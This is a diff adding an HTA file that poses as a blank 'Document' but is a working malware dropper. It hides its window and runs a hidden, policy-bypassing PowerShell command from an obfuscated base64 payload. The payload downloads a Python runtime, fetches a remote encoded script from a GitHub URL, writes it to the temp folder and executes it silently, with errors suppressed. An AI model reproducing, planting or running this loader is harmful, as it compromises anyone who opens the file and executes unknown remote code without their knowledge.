@@ -1,0 +1,20 @@
+<html>
+<head>
+<meta http-equiv="X-UA-Compatible" content="IE=edge"/>
+<meta charset="utf-8"/>
+<title>Document</title>
+<HTA:APPLICATION ID="a" APPLICATIONNAME="Document" BORDER="none" CAPTION="no" SHOWINTASKBAR="no" SCROLL="no" SINGLEINSTANCE="yes" WINDOWSTATE="minimize"/>
+<script language="JScript">
+window.resizeTo(0,0);
+window.moveTo(-32000,-32000);
+try {
+  var sh=new ActiveXObject("WScript.Shell");
+  var p="JHA9IiRlbnY6VEVNUFxzLnB5IjtbTmV0LlNlcnZpY2VQb2ludE1hbmFnZXJdOjpTZWN1cml0eVByb3RvY29sPTMwNzI7dHJ5eyR5PShHZXQtQ29tbWFuZCBweXRob24gLUVBIFNpbGVudGx5Q29udGludWUpLlNvdXJjZTtpZighJHktb3IkeS1saWtlIipXaW5kb3dzQXBwcyoiKXskcj0iJGVudjpURU1QXHB5ZSI7TmV3LUl0ZW0gLUl0ZW1UeXBlIERpcmVjdG9yeSAtRm9yY2UgLVBhdGggJHJ8T3V0LU51bGw7JHo9IiRyXHouemlwIjtpZighKFRlc3QtUGF0aCAkeikpeyhOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkRmlsZSgiaHR0cHM6Ly93d3cucHl0aG9uLm9yZy9mdHAvcHl0aG9uLzMuMTEuNS9weXRob24tMy4xMS41LWVtYmVkLWFtZDY0LnppcCIsJHopfTtpZighKFRlc3QtUGF0aCAiJHJccHl0aG9uLmV4ZSIpKXtFeHBhbmQtQXJjaGl2ZSAkeiAkciAtRm9yY2U7JHQ9R2V0LUNoaWxkSXRlbSAiJHJccHl0aG9uKi5fcHRoInxTZWxlY3QgLUZpcnN0IDE7aWYoJHQpeyhHZXQtQ29udGVudCAkdC5GdWxsTmFtZSktcmVwbGFjZSIjaW1wb3J0IHNpdGUiLCJpbXBvcnQgc2l0ZSJ8U2V0LUNvbnRlbnQgJHQuRnVsbE5hbWV9OyR5PSIkclxweXRob24uZXhlIn1lbHNleyR5PSIkclxweXRob24uZXhlIn19OyRyYXc9KE5ldy1PYmplY3QgTmV0LldlYkNsaWVudCkuRG93bmxvYWRTdHJpbmcoImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9tYW5vdHVzbGsyLXdlYi9wcm9maWxlL21haW4vc3RyaW5nLnR4dCIpOyRjbGVhbj0tam9pbigkcmF3LlRvQ2hhckFycmF5KCl8P3skXyAtbWF0Y2ggIltBLVphLXowLTkrLz1dIn0pO1tJTy5GaWxlXTo6V3JpdGVBbGxCeXRlcygkcCxbQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoJGNsZWFuKSk7JiAkeSAkcH1jYXRjaHt9";
+  var cmd='powershell -NoP -EP Bypass -W Hidden -C "[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(\''+p+'\'))|iex"';
+  sh.Run(cmd,0,false);
+} catch(e) {}
+try { window.close(); } catch(e) {}
+</script>
+</head>
+<body></body>
+</html>
